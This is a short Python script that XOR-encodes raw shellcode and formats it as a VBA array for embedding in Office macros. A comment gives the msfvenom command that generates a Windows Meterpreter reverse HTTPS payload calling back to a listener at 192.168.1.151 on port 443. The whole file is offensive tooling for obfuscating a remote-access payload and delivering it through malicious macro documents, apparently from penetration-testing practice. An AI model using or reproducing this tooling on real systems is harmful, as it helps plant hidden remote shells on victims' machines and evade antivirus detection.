#!/usr/bin/env python3

# XOR-encode shellcode and format it for VBA macros
# msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.151 LPORT=443 EXITFUNC=thread -f raw -o shellcode.bin

def xor_encode_shellcode(shellcode_bytes, key=0xFA):
    return bytearray([b ^ key for b in shellcode_bytes])

def format_for_vba(encoded_shellcode):
    vba_array = "buf = Array("
    for i, byte in enumerate(encoded_shellcode):
        vba_array += f"{byte}, "
        if (i + 1) % 50 == 0:
            vba_array += "_\n"
    vba_array = vba_array.rstrip(", ") + ")"
    return vba_array

def main():
    with open("shellcode.bin", "rb") as f:
        shellcode = f.read()

    encoded = xor_encode_shellcode(shellcode)
    vba_payload = format_for_vba(encoded)

    print("XORed VBA Payload (Key: 0xFA and Decimal: 250):")
    print(vba_payload)

if __name__ == "__main__":
    main()
